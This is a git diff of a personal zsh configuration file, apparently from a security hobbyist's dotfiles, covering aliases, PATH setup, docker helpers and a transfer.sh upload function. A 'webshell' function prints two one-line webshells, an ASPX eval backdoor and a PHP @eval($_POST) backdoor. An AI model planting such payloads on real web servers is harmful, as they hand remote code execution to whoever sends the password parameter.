@@ -81,7 +81,6 @@ setopt correct #自動校正
 zstyle ':completion:*' matcher-list '' 'm:{a-zA-Z}={A-Za-z}'  #大小寫修正
 zstyle ':completion:*:*:*:*:*' menu select  #開啟補齊select顏色
 
-
 #autojump
 [[ -s /usr/share/autojump/autojump.sh ]] && source /usr/share/autojump/autojump.sh
 #autoload -U compinit && compinit -u
@@ -93,6 +92,31 @@ export LSCOLORS='exfxcxdxbxGxDxabagacad'
 # Define colors for the completion system.
 export LS_COLORS='di=34:ln=35:so=32:pi=33:ex=31:bd=36;01:cd=33;01:su=31;40;07:sg=36;40;07:tw=32;40;07:ow=33;40;07:'
 zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}
+
+export LANGUAGE="en_US.UTF-8"
+export LANG="en_US.UTF-8"
+export LC_ALL="en_US.UTF-8"
+
+# Setup PATH
+export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$HOME/.dotfiles/tools"
+if [ `uname` = "Darwin" ]; then
+    export PATH="/usr/local/opt/python@2/libexec/bin:$PATH"
+fi
+
+if uname | grep -q 'MINGW64'; then
+    export PATH="/c/msys64/mingw64/bin:$PATH"
+fi
+
+if [ -d  ~/go ]; then
+    export PATH="$HOME/go/bin:$PATH"
+fi
+
+if [ -d /usr/local/opt/openjdk/bin ]; then
+    export PATH="/usr/local/opt/openjdk/bin:$PATH"
+fi
+
+
+
 if ls --color -d . &>/dev/null 2>&1
 then
     # Linux Style
@@ -105,16 +129,6 @@ fi
 alias vi='vim --noplugin'
 alias ll='ls -la'
 alias grep='grep --color'
-export LANGUAGE="en_US.UTF-8"
-export LANG="en_US.UTF-8"
-export LC_ALL="en_US.UTF-8"
-export PATH="/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:$HOME/.dotfiles/tools"
-if [ `uname` = "Darwin" ]; then
-    export PATH="/usr/local/opt/python@2/libexec/bin:$PATH"
-fi
-if uname | grep -q 'MINGW64'; then
-    export PATH="/c/msys64/mingw64/bin:$PATH"
-fi
 
 alias -s rm='rm -i'
 alias -s gz='tar -xzvf'
@@ -144,30 +158,28 @@ alias gc='git checkout'
 alias gb='git branch'
 alias gs='git status'
 
-alias ida='wine ~/Documents/idaPro6.8/idaq.exe  >> /dev/null 2>&1 &'
-alias ida64='wine ~/Documents/idaPro6.8/idaq64.exe  >> /dev/null 2>&1 &'
-
 if [ `uname` = "Darwin" ]; then
     alias php70='brew link php70'
     alias php55='brew link php55'
     alias php56='brew link php56'
     alias brewup='brew upgrade && brew cleanup'
-    [[ -s /Users/zet/.autojump/etc/profile.d/autojump.sh ]] && source /Users/zet/.autojump/etc/profile.d/autojump.sh
 fi
 
-alias pys='python -m SimpleHTTPServer'
-alias py3s='python3 -m http.server'
+alias pys='python3 -m http.server'
 alias phps='php -S 0.0.0.0:9000'
 
 if [ -d ~/.ctf-tools ]; then
     source ~/.ctf-tools/pwn
 fi
 
+
+. $HOME/.dotfiles/tools/z.sh
+
 alias nc='netcat'
 alias shutdown='shutdown -h now'
 alias reboot='shutdown -r now'
 alias freemem='echo 1 > /proc/sys/vm/drop_caches'
-alias ip='curl ip.zet.tw'
+alias ip='curl https://am.i.mullvad.net/ip'
 
 
 function x(){
@@ -187,13 +199,15 @@ function da(){
     docker exec -it $1 zsh
 }
 
+function docker-cleanup(){
+    docker rmi $(docker images -f "dangling=true" -q)
+}
+
+
 function webshell(){
     echo "aspx : <%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"pass\"],\"unsafe\");%>"
     echo "php : <?php @eval(\$_POST['pass']);?>"
-
 }
 
 #transfer.sh
-transfer() { if [ $# -eq 0 ]; then echo -e "No arguments specified. Usage:\necho transfer /tmp/test.md\ncat /tmp/test.md | transfer test.md"; return 1; fi
-tmpfile=$( mktemp -t transferXXX ); if tty -s; then basefile=$(basename "$1" | sed -e 's/[^a-zA-Z0-9._-]/-/g'); curl --progress-bar --upload-file "$1" "https://transfer.sh/$basefile" >> $tmpfile; else curl --progress-bar --upload-file "-" "https://transfer.sh/$1" >> $tmpfile ; fi; cat $tmpfile; rm -f $tmpfile; }
-
+transfer(){ if [ $# -eq 0 ];then echo "No arguments specified.\nUsage:\n transfer <file|directory>\n ... | transfer <file_name>">&2;return 1;fi;if tty -s;then file="$1";file_name=$(basename "$file");if [ ! -e "$file" ];then echo "$file: No such file or directory">&2;return 1;fi;if [ -d "$file" ];then file_name="$file_name.zip" ,;(cd "$file"&&zip -r -q - .)|curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name"|tee /dev/null,;else cat "$file"|curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name"|tee /dev/null;fi;else file_name=$1;curl --progress-bar --upload-file "-" "https://transfer.sh/$file_name"|tee /dev/null;fi;}
